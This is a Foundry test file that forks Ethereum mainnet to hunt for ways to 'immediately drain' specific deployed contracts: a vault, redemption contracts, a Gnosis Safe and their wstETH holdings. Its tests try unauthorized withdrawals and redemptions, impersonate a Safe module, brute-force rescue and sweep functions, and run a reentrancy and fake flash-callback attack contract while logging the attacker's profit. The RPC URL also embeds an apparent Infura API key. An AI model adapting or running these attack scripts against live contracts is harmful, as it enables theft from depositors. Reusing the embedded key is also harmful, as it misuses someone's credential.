// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
}

interface IVault {
    function asset() external view returns (address);
    function totalAssets() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function deposit(uint256, address) external returns (uint256);
    function withdraw(uint256, address, address) external returns (uint256);
    function redeem(uint256, address, address) external returns (uint256);
    function maxWithdraw(address) external view returns (uint256);
    function maxRedeem(address) external view returns (uint256);
}

/**
 * NOVEL EXPLOIT VECTOR SEARCH
 *
 * Exploring unconventional paths for immediate drain:
 * 1. ERC4626 VAULT exploitation
 * 2. Timelock queue bypasses
 * 3. Multi-contract state confusion
 * 4. Cross-contract reentrancy
 * 5. Storage slot manipulation via external contracts
 * 6. Governance/admin backdoors
 */
contract NovelExploitVectors is Test {
    address constant R0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant RC = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;

    // Gnosis Safe
    address constant SAFE = 0xd3E4C3552a3eEdA56c7A1d86768E67f7dcB2f25E;

    // Timelock
    address constant TIMELOCK = 0xB4C4Bf7Df23c74f4A7bf4c7a5F5E3C3Bc7E2BE3C;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_ExploitVAULTasERC4626() public {
        console.log("=== EXPLOIT VAULT AS ERC4626 ===\n");

        // Check if VAULT is an ERC4626
        console.log("VAULT:", VAULT);

        // Try ERC4626 view functions
        (bool s1, bytes memory d1) = VAULT.staticcall(abi.encodeWithSignature("asset()"));
        if (s1 && d1.length >= 32) {
            address asset = abi.decode(d1, (address));
            console.log("asset():", asset);
        }

        (bool s2, bytes memory d2) = VAULT.staticcall(abi.encodeWithSignature("totalAssets()"));
        if (s2 && d2.length >= 32) {
            uint256 totalAssets = abi.decode(d2, (uint256));
            console.log("totalAssets():", totalAssets / 1e18);
        }

        (bool s3, bytes memory d3) = VAULT.staticcall(abi.encodeWithSignature("totalSupply()"));
        if (s3 && d3.length >= 32) {
            uint256 totalSupply = abi.decode(d3, (uint256));
            console.log("totalSupply():", totalSupply / 1e18);
        }

        // Check attacker's max withdraw
        (bool s4, bytes memory d4) = VAULT.staticcall(abi.encodeWithSignature("maxWithdraw(address)", attacker));
        if (s4 && d4.length >= 32) {
            uint256 maxW = abi.decode(d4, (uint256));
            console.log("maxWithdraw(attacker):", maxW);
        }

        // Try to directly withdraw
        vm.startPrank(attacker);

        console.log("\nTrying ERC4626 withdrawals...");

        (bool w1,) = VAULT.call(abi.encodeWithSignature("withdraw(uint256,address,address)", 1e18, attacker, attacker));
        console.log("withdraw(1e18, attacker, attacker):", w1);

        (bool w2,) = VAULT.call(abi.encodeWithSignature("redeem(uint256,address,address)", 1e18, attacker, attacker));
        console.log("redeem(1e18, attacker, attacker):", w2);

        // Try with R0 as owner
        (bool w3,) = VAULT.call(abi.encodeWithSignature("withdraw(uint256,address,address)", 1e18, attacker, R0));
        console.log("withdraw(1e18, attacker, R0):", w3);

        // Try with RC as owner
        (bool w4,) = VAULT.call(abi.encodeWithSignature("withdraw(uint256,address,address)", 1e18, attacker, RC));
        console.log("withdraw(1e18, attacker, RC):", w4);

        vm.stopPrank();

        console.log("\nAttacker wstETH:", IERC20(wstETH).balanceOf(attacker));
    }

    function test_CheckVAULTOwnerAndRoles() public {
        console.log("=== CHECK VAULT OWNER AND ROLES ===\n");

        // Check owner
        (bool s1, bytes memory d1) = VAULT.staticcall(abi.encodeWithSignature("owner()"));
        if (s1 && d1.length >= 32) {
            console.log("owner():", abi.decode(d1, (address)));
        }

        // Check admin
        (bool s2, bytes memory d2) = VAULT.staticcall(abi.encodeWithSignature("admin()"));
        if (s2 && d2.length >= 32) {
            console.log("admin():", abi.decode(d2, (address)));
        }

        // Check various role getters
        bytes4[] memory roleGetters = new bytes4[](10);
        roleGetters[0] = bytes4(keccak256("ADMIN_ROLE()"));
        roleGetters[1] = bytes4(keccak256("DEFAULT_ADMIN_ROLE()"));
        roleGetters[2] = bytes4(keccak256("MINTER_ROLE()"));
        roleGetters[3] = bytes4(keccak256("BURNER_ROLE()"));
        roleGetters[4] = bytes4(keccak256("WITHDRAWER_ROLE()"));
        roleGetters[5] = bytes4(keccak256("MANAGER_ROLE()"));
        roleGetters[6] = bytes4(keccak256("GUARDIAN_ROLE()"));
        roleGetters[7] = bytes4(keccak256("OPERATOR_ROLE()"));
        roleGetters[8] = bytes4(keccak256("PAUSER_ROLE()"));
        roleGetters[9] = bytes4(keccak256("getRoleMemberCount(bytes32)"));

        console.log("\nChecking roles...");
        for (uint i = 0; i < roleGetters.length; i++) {
            (bool s, bytes memory d) = VAULT.staticcall(abi.encodeWithSelector(roleGetters[i]));
            if (s && d.length > 0) {
                console.log("Found role at index:", i);
                console.logBytes(d);
            }
        }

        // Check if attacker has any role
        bytes32 defaultAdmin = bytes32(0);
        (bool sr,) = VAULT.staticcall(abi.encodeWithSignature("hasRole(bytes32,address)", defaultAdmin, attacker));
        console.log("\nAttacker hasRole(DEFAULT_ADMIN):", sr);
    }

    function test_CheckTimelockPendingOps() public {
        console.log("=== CHECK TIMELOCK PENDING OPERATIONS ===\n");

        // Try to find timelock
        // Check R0 for timelock reference
        bytes32 slot6 = vm.load(R0, bytes32(uint256(6)));
        console.log("R0 slot 6:");
        console.logBytes32(slot6);

        bytes32 slot7 = vm.load(R0, bytes32(uint256(7)));
        console.log("R0 slot 7:");
        console.logBytes32(slot7);

        // Gnosis Safe operations
        console.log("\nGnosis Safe:", SAFE);
        console.log("Safe code size:", SAFE.code.length);

        if (SAFE.code.length > 0) {
            // Check nonce
            (bool s1, bytes memory d1) = SAFE.staticcall(abi.encodeWithSignature("nonce()"));
            if (s1 && d1.length >= 32) {
                console.log("Safe nonce:", abi.decode(d1, (uint256)));
            }

            // Check threshold
            (bool s2, bytes memory d2) = SAFE.staticcall(abi.encodeWithSignature("getThreshold()"));
            if (s2 && d2.length >= 32) {
                console.log("Safe threshold:", abi.decode(d2, (uint256)));
            }

            // Check owners
            (bool s3, bytes memory d3) = SAFE.staticcall(abi.encodeWithSignature("getOwners()"));
            if (s3 && d3.length > 0) {
                address[] memory owners = abi.decode(d3, (address[]));
                console.log("Safe owners count:", owners.length);
            }
        }
    }

    function test_ExploitViaModuleCalls() public {
        console.log("=== EXPLOIT VIA MODULE CALLS ===\n");

        // Check if Gnosis Safe has modules enabled
        if (SAFE.code.length > 0) {
            console.log("Checking Safe modules...");

            // Get enabled modules
            (bool s1, bytes memory d1) = SAFE.staticcall(
                abi.encodeWithSignature("getModulesPaginated(address,uint256)", address(0x1), 10)
            );
            if (s1 && d1.length > 0) {
                console.log("Modules data:");
                console.logBytes(d1);
            }

            // Check if any address can execTransactionFromModule
            vm.startPrank(attacker);

            // Try to execute as module
            bytes memory callData = abi.encodeWithSignature(
                "transfer(address,uint256)",
                attacker,
                1000e18
            );

            (bool s2,) = SAFE.call(
                abi.encodeWithSignature(
                    "execTransactionFromModule(address,uint256,bytes,uint8)",
                    wstETH,
                    0,
                    callData,
                    0 // Call
                )
            );
            console.log("execTransactionFromModule:", s2);

            vm.stopPrank();
        }

        console.log("\nAttacker wstETH:", IERC20(wstETH).balanceOf(attacker));
    }

    function test_CrossContractDelegateCallExploit() public {
        console.log("=== CROSS-CONTRACT DELEGATECALL EXPLOIT ===\n");

        // Deploy attack contract
        AttackContract attk = new AttackContract(R0, RC, VAULT, wstETH, TASSET);

        deal(TASSET, address(attk), 100000e18);
        deal(wstETH, address(attk), 10e18);

        uint256 wstethBefore = IERC20(wstETH).balanceOf(address(attk));
        console.log("Attack contract wstETH before:", wstethBefore / 1e18);

        vm.startPrank(attacker);

        // Try various attack vectors
        console.log("\nExecuting attack vectors...");

        attk.attack1_DirectRCCall();
        attk.attack2_ReentrancyViaReceive();
        attk.attack3_FlashCallback();

        vm.stopPrank();

        uint256 wstethAfter = IERC20(wstETH).balanceOf(address(attk));
        console.log("\nAttack contract wstETH after:", wstethAfter / 1e18);
        console.log("Profit:", (wstethAfter - wstethBefore) / 1e18, "wstETH");
    }

    function test_ExploitViaRCStorageContext() public {
        console.log("=== EXPLOIT VIA RC STORAGE CONTEXT ===\n");

        // Key insight: RC has delay=0 in its own storage
        // If we can make RC execute finalizeRedeem using its own storage...

        console.log("RC storage slot 4 (delay=0):");
        bytes32 rcSlot4 = vm.load(RC, bytes32(uint256(4)));
        console.logBytes32(rcSlot4);

        console.log("R0 storage slot 4 (delay=7 days):");
        bytes32 r0Slot4 = vm.load(R0, bytes32(uint256(4)));
        console.logBytes32(r0Slot4);

        // Try to call RC in a way that makes it use its own storage
        deal(TASSET, attacker, 100000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(RC, type(uint256).max);
        IERC20(TASSET).approve(R0, type(uint256).max);

        uint256 wstethBefore = IERC20(wstETH).balanceOf(attacker);

        // Various call patterns
        console.log("\nTrying various call patterns...");

        // Pattern 1: Direct call to RC
        (bool s1,) = RC.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));
        console.log("RC.redeem direct:", s1);

        // Pattern 2: Call RC via low-level call with different msg.sender
        (bool s2,) = RC.call{gas: 500000}(abi.encodeWithSignature("redeem(uint256,address)", 1000e18, attacker));
        console.log("RC.redeem(amount,addr):", s2);

        // Pattern 3: Check if there's a fallback that routes differently
        (bool s3,) = RC.call(abi.encodeWithSignature("executeRedeem(uint256,address)", 1000e18, attacker));
        console.log("RC.executeRedeem:", s3);

        // Pattern 4: finalizeRedeem with index
        (bool s4,) = RC.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));
        console.log("RC.finalizeRedeem:", s4);

        vm.stopPrank();

        uint256 wstethAfter = IERC20(wstETH).balanceOf(attacker);
        console.log("\nwstETH gained:", (wstethAfter - wstethBefore) / 1e18);
    }

    function test_ProbeAllStorageSlots() public view {
        console.log("=== PROBE ALL STORAGE SLOTS ===\n");

        // Check slots 0-20 of R0 for interesting data
        console.log("R0 storage slots 0-20:");
        for (uint i = 0; i <= 20; i++) {
            bytes32 slot = vm.load(R0, bytes32(uint256(i)));
            if (slot != bytes32(0)) {
                console.log("Slot", i);
                console.logBytes32(slot);
            }
        }

        console.log("\nRC storage slots 0-20:");
        for (uint i = 0; i <= 20; i++) {
            bytes32 slot = vm.load(RC, bytes32(uint256(i)));
            if (slot != bytes32(0)) {
                console.log("Slot", i);
                console.logBytes32(slot);
            }
        }

        console.log("\nVAULT storage slots 0-20:");
        for (uint i = 0; i <= 20; i++) {
            bytes32 slot = vm.load(VAULT, bytes32(uint256(i)));
            if (slot != bytes32(0)) {
                console.log("Slot", i);
                console.logBytes32(slot);
            }
        }
    }

    function test_CheckPendingRedemptions() public {
        console.log("=== CHECK PENDING REDEMPTIONS ===\n");

        // Scan for any addresses with pending redemptions
        // redemptions mapping is at slot 5

        // Check some known addresses
        address[] memory checkAddrs = new address[](10);
        checkAddrs[0] = SAFE;
        checkAddrs[1] = VAULT;
        checkAddrs[2] = RC;
        checkAddrs[3] = R0;
        checkAddrs[4] = 0x0000000000000000000000000000000000000001;
        checkAddrs[5] = 0x0000000000000000000000000000000000000000;
        checkAddrs[6] = 0xdEad000000000000000000000000000000000000;
        checkAddrs[7] = address(this);
        checkAddrs[8] = attacker;
        checkAddrs[9] = 0x0000000000000000000000000000000000000002;

        for (uint i = 0; i < checkAddrs.length; i++) {
            // Calculate mapping slot
            bytes32 arrayLengthSlot = keccak256(abi.encode(checkAddrs[i], uint256(5)));
            bytes32 lengthData = vm.load(R0, arrayLengthSlot);
            uint256 length = uint256(lengthData);

            if (length > 0) {
                console.log("Found redemption for address:", checkAddrs[i]);
                console.log("Length:", length);

                // Get first redemption data
                bytes32 baseSlot = keccak256(abi.encode(arrayLengthSlot));
                for (uint j = 0; j < 2 && j < length; j++) {
                    bytes32 redeemSlot0 = vm.load(R0, bytes32(uint256(baseSlot) + j * 2));
                    bytes32 redeemSlot1 = vm.load(R0, bytes32(uint256(baseSlot) + j * 2 + 1));

                    console.log("Redemption", j);
                    console.logBytes32(redeemSlot0);
                    console.logBytes32(redeemSlot1);

                    // Decode maturity time (slot0, bits 0-95)
                    uint96 maturity = uint96(uint256(redeemSlot0));
                    uint96 amount = uint96(uint256(redeemSlot0) >> 96);
                    console.log("Maturity timestamp:", maturity);
                    console.log("Amount:", amount);
                    console.log("Current time:", block.timestamp);

                    if (block.timestamp >= maturity) {
                        console.log("*** REDEMPTION IS MATURE! ***");
                    }
                }
            }
        }
    }

    function test_DirectTransferFromVaultAllowance() public {
        console.log("=== DIRECT TRANSFER FROM VAULT ALLOWANCE ===\n");

        // RC has unlimited wstETH allowance from VAULT
        uint256 allowance = IERC20(wstETH).allowance(VAULT, RC);
        console.log("VAULT->RC wstETH allowance:", allowance == type(uint256).max ? 999999999 : allowance / 1e18);

        // Can we trick wstETH into thinking we're RC?
        vm.startPrank(attacker);

        uint256 vaultBalance = IERC20(wstETH).balanceOf(VAULT);
        console.log("VAULT wstETH balance:", vaultBalance / 1e18);

        // Try various impersonation techniques
        console.log("\nTrying various techniques...");

        // 1. Direct transferFrom (will fail - we're not RC)
        (bool s1,) = wstETH.call(
            abi.encodeWithSignature("transferFrom(address,address,uint256)", VAULT, attacker, 1000e18)
        );
        console.log("Direct transferFrom:", s1);

        vm.stopPrank();

        // 2. If we could make a call appear to come from RC...
        // This would require finding a way to execute code as RC

        // Check if RC has any external call functions
        console.log("\nSearching for RC external call functions...");

        bytes4[] memory sigs = new bytes4[](10);
        sigs[0] = bytes4(keccak256("execute(address,uint256,bytes)"));
        sigs[1] = bytes4(keccak256("call(address,bytes)"));
        sigs[2] = bytes4(keccak256("multicall(bytes[])"));
        sigs[3] = bytes4(keccak256("batch(bytes[])"));
        sigs[4] = bytes4(keccak256("executeTransaction(address,uint256,bytes)"));
        sigs[5] = bytes4(keccak256("sendAsset(address,uint256)"));
        sigs[6] = bytes4(keccak256("rescue(address,uint256)"));
        sigs[7] = bytes4(keccak256("sweep(address)"));
        sigs[8] = bytes4(keccak256("emergencyWithdraw(address,uint256)"));
        sigs[9] = bytes4(keccak256("withdrawToken(address,uint256)"));

        vm.startPrank(attacker);
        for (uint i = 0; i < sigs.length; i++) {
            // Try calling RC with these signatures
            bytes memory data;
            if (i <= 1 || i == 4) {
                data = abi.encodeWithSelector(sigs[i], wstETH, 0, "");
            } else if (i == 2 || i == 3) {
                bytes[] memory calls = new bytes[](1);
                calls[0] = abi.encodeWithSignature("transfer(address,uint256)", attacker, 1e18);
                data = abi.encodeWithSelector(sigs[i], calls);
            } else {
                data = abi.encodeWithSelector(sigs[i], attacker, 1000e18);
            }

            (bool s,) = RC.call(data);
            if (s) {
                console.log("Success with selector:", i);
                console.logBytes4(sigs[i]);
            }
        }
        vm.stopPrank();

        console.log("\nAttacker wstETH:", IERC20(wstETH).balanceOf(attacker));
    }
}

contract AttackContract {
    address r0;
    address rc;
    address vault;
    address wsteth;
    address tasset;

    bool inCallback;

    constructor(address _r0, address _rc, address _vault, address _wsteth, address _tasset) {
        r0 = _r0;
        rc = _rc;
        vault = _vault;
        wsteth = _wsteth;
        tasset = _tasset;

        IERC20(_tasset).approve(_r0, type(uint256).max);
        IERC20(_tasset).approve(_rc, type(uint256).max);
        IERC20(_wsteth).approve(_r0, type(uint256).max);
    }

    function attack1_DirectRCCall() external {
        // Try calling RC directly
        rc.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));
        rc.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));
    }

    function attack2_ReentrancyViaReceive() external {
        // Try to trigger reentrancy via ETH receive
        r0.call{value: 0.1 ether}("");
    }

    function attack3_FlashCallback() external {
        // Try various flash loan callbacks
        r0.call(abi.encodeWithSignature(
            "uniswapV3FlashCallback(uint256,uint256,bytes)",
            0, 0, ""
        ));

        r0.call(abi.encodeWithSignature(
            "receiveFlashLoan(address[],uint256[],uint256[],bytes)",
            new address[](0), new uint256[](0), new uint256[](0), ""
        ));
    }

    receive() external payable {
        if (!inCallback) {
            inCallback = true;
            // Try reentrancy
            r0.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));
            inCallback = false;
        }
    }

    fallback() external payable {
        // Called during any external interaction
        if (!inCallback) {
            inCallback = true;
            r0.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));
            inCallback = false;
        }
    }
}
